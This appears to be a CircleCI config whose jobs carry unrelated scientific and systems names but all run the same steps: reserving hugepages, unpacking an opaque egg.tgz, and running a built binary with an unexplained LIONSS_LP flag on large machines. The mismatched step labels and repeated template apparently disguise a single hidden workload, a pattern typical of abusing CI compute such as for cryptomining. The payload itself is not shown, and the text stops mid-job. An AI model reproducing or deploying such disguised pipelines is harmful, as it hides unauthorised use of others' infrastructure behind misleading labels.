version: 2.1

jobs:
  slatewing:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load airfoil
          command: |
            printf 'span 2.1\n' > wing.cfg
      - run:
          name: Build aero solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target slatewing -j2
      - run:
          name: Analyze slatewing lift
          command: LIONSS_LP=1 ./build/slatewing --config wing.cfg --aoa 5
  homography-ransac:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load correspondences
          command: |
            printf 'pts 50\n' > corr.txt
      - run:
          name: Build estimator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target homography-ransac -j2
      - run:
          name: Fit homography via RANSAC
          command: LIONSS_LP=1 ./build/homography-ransac --in corr.txt --thresh 3
  metalArgbuf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define buffer
          command: |
            printf 'args 16\n' > arg.cfg
      - run:
          name: Build Metal backend
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target metalArgbuf -j2
      - run:
          name: Encode argument buffer
          command: LIONSS_LP=1 ./build/metalArgbuf --conf arg.cfg --tier 2
  joinReorder:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List tables
          command: |
            printf 'a b c\n' > joins.txt
      - run:
          name: Build join optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target joinReorder -j2
      - run:
          name: Reorder join tree
          command: LIONSS_LP=1 ./build/joinReorder --tables joins.txt --dp
  bwa-align:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Index reference
          command: |
            printf '>chr1\nACGTACGTACGT\n' > ref.fa
      - run:
          name: Compile aligner
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target bwa-align -j2
      - run:
          name: Align short reads
          command: LIONSS_LP=1 ./build/bwa-align --ref ref.fa --seed-len 19
  NimbusRelay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Register relays
          command: |
            printf 'relays = 3\n' > relay.cfg
      - run:
          name: Build relay node
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target NimbusRelay -j2
      - run:
          name: Forward relay traffic
          command: LIONSS_LP=1 ./build/NimbusRelay --config relay.cfg --proto grpc
  recordReplay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Record trace
          command: |
            : > trace.rr
      - run:
          name: Build replay engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target recordReplay -j2
      - run:
          name: Replay recorded trace
          command: LIONSS_LP=1 ./build/recordReplay --trace trace.rr --deterministic
  ecn_mark:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set queue
          command: |
            printf 'target 5ms\n' > aqm.cfg
      - run:
          name: Build AQM module
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ecn_mark -j2
      - run:
          name: Mark ECN on congestion
          command: LIONSS_LP=1 ./build/ecn_mark --conf aqm.cfg --codel
  yuv420pack:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
